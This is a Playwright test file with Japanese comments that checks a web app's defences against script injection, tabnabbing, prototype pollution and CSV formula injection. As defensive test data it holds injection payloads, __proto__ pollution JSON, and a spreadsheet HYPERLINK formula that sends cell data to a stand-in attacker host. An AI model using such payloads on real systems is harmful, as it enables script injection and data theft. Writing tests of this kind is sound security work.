// 配布物そのもの (dist/*.html) の守りを、攻める側から確かめる。
//
// - CSP: 入り込んだ <script> やイベント属性を**ブラウザが走らせない**こと。
//   画面は textContent しか使わないが、それが破れたときの二段目の網
// - 新しい窓で開くリンクが、開いた先から元のページを操れないこと (タブナビング)
// - 読み込むファイルに `__proto__` を仕込んでも、オブジェクトの原型を
//   汚せないこと (プロトタイプ汚染)
// - CSV に書き出した名前が、表計算ソフトで式として走らないこと (CSV インジェクション)
const path = require("path");
const fs = require("fs/promises");
const os = require("os");
const { pathToFileURL } = require("url");
const { test, expect } = require("@playwright/test");
const { open } = require("./support");

const LANDING = pathToFileURL(
  path.resolve(__dirname, "../../dist/index.html"),
).href;

/** ページに <script> とイベント属性を差し込み、走ったかどうかを返す。 */
async function tryToInject(page) {
  return page.evaluate(async () => {
    const violations = [];
    document.addEventListener("securitypolicyviolation", (event) =>
      violations.push(event.violatedDirective),
    );
    const script = document.createElement("script");
    script.textContent = "window.__pwned = 'script';";
    document.body.append(script);
    const image = document.createElement("img");
    image.setAttribute("onerror", "window.__pwned = 'handler';");
    image.src = "data:,";
    document.body.append(image);
    const link = document.createElement("a");
    link.href = "javascript:window.__pwned='url'";
    document.body.append(link);
    link.click();
    // `eval` はここでは試せない。`page.evaluate` は開発者ツール越しに走り、
    // その中の eval は CSP の外に置かれる (試したら "ran" になった)。
    // 方針に 'unsafe-eval' が無いことを、方針の文字列のほうで見ている。
    // 違反の知らせは非同期に届く。
    await new Promise((resolve) => setTimeout(resolve, 200));
    return { pwned: window.__pwned, violations };
  });
}

test("道具本体: 差し込まれたスクリプトは CSP が走らせない", async ({
  page,
}) => {
  await open(page);
  const policy = await page
    .locator('meta[http-equiv="Content-Security-Policy"]')
    .getAttribute("content");
  // スクリプトはハッシュで名指し。何でも通す書き方をしていない。
  expect(policy).toMatch(/script-src 'sha256-/);
  expect(policy).not.toContain("'unsafe-inline' 'wasm");
  expect(policy?.split(";").find((d) => d.includes("script-src"))).not.toMatch(
    /'unsafe-inline'|'unsafe-eval'|\*/,
  );

  const result = await tryToInject(page);
  expect(result.pwned).toBeUndefined();
  expect(result.violations).toContain("script-src-elem");
});

test("紹介ページ: 差し込まれたスクリプトは CSP が走らせない", async ({
  page,
}) => {
  await page.goto(LANDING);
  // 紹介ページ自身のスクリプト (言語の切り替え) は動く。
  await page.click('[data-set-lang="ja"]');
  await expect(page.locator("body")).toHaveAttribute("data-lang", "ja");

  const result = await tryToInject(page);
  expect(result.pwned).toBeUndefined();
  expect(result.violations).toContain("script-src-elem");
});

test("新しい窓で開くリンクは、開いた先に元のページを渡さない", async ({
  page,
}) => {
  await open(page);
  // コメントにリンクを書いて、リンクが生える状態にする。
  await page.click('.tabs button[data-tab="tasks"]');
  await page
    .locator(".task-table tbody tr")
    .nth(1)
    .locator(".comment-open")
    .click();
  await page.locator(".comment-input").fill("[外](https://example.com/)");
  await page.click('button[data-action="post-comment"]');
  await expect(page.locator(".comment .markdown a")).toHaveCount(1);

  for (const url of [null, LANDING]) {
    if (url) await page.goto(url);
    const unsafe = await page.evaluate(() =>
      [...document.querySelectorAll('a[target="_blank"]')]
        .filter((a) => !/\bnoopener\b/.test(a.rel))
        .map((a) => a.outerHTML.slice(0, 120)),
    );
    expect(unsafe, `rel="noopener" の無いリンク (${url ?? "app"})`).toEqual([]);
  }
});

test("読み込むファイルに __proto__ を仕込んでも、原型は汚れない", async ({
  page,
}) => {
  const { errors } = await open(page);
  const poisoned = `{
    "schema": "man-hour-calculator",
    "name": "p",
    "__proto__": {"polluted": "top"},
    "document": {
      "__proto__": {"polluted": "document"},
      "tasks": [{"id": "a", "name": "A", "__proto__": {"polluted": "task"}}],
      "settings": {"constructor": {"prototype": {"polluted": "ctor"}}},
      "calendar": {"members": [{"__proto__": {"polluted": "member"}}]}
    }
  }`;
  await page.setInputFiles('input[type="file"][accept*="json"]', {
    name: "poisoned.mhc.json",
    mimeType: "application/json",
    buffer: Buffer.from(poisoned),
  });
  await expect(page.locator("#status")).toContainText("読み込みました");
  const polluted = await page.evaluate(() => ({
    object: {}.polluted,
    array: [].polluted,
  }));
  expect(polluted).toEqual({ object: undefined, array: undefined });
  expect(errors).toEqual([]);
});

test("CSV に書き出した名前は、表計算ソフトで式として走らない", async ({
  page,
}) => {
  await open(page);
  await page.click('.tabs button[data-tab="tasks"]');
  const name = page
    .locator(".task-table tbody tr")
    .nth(1)
    .locator('input[type="text"]')
    .first();
  const formula = '=HYPERLINK("https://evil.example/?"&A1,"見て")';
  await name.fill(formula);
  await name.press("Tab");

  await page.click(".menu > summary");
  const [download] = await Promise.all([
    page.waitForEvent("download"),
    page.click('.menu-panel button:text("CSV で書き出す")'),
  ]);
  const file = path.join(os.tmpdir(), `mhc-${Date.now()}.csv`);
  await download.saveAs(file);
  const csv = await fs.readFile(file, "utf8");
  await fs.unlink(file);

  // どのセルも =, +, -, @ で始まらない (引用符の中も含めて)。
  const line = csv.split("\n").find((l) => l.includes("HYPERLINK"));
  expect(line).toBeDefined();
  expect(line).toContain("'=HYPERLINK");
  expect(line).not.toMatch(/(^|,)"?[=+@]/);
});
